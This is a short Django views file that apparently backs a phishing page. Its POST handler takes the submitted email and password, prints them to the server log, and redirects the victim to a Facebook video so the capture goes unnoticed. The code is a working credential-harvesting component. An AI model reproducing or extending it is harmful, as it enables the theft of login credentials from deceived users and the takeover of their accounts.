from django.shortcuts import render
from django.http.response import HttpResponseRedirect
from kn.forms import FledForm



# Create your views here.
def oo(request):
    if request.method == "GET":
        
        
        return render(request,"name.html")

    if request.method == "POST":
        
         o_name = request.POST.get('email')  
         o_pw = request.POST.get('pass')
         print(o_name)
         print(o_pw)
         return HttpResponseRedirect("https://www.facebook.com/Issuepage/videos/1843338325969054/")

    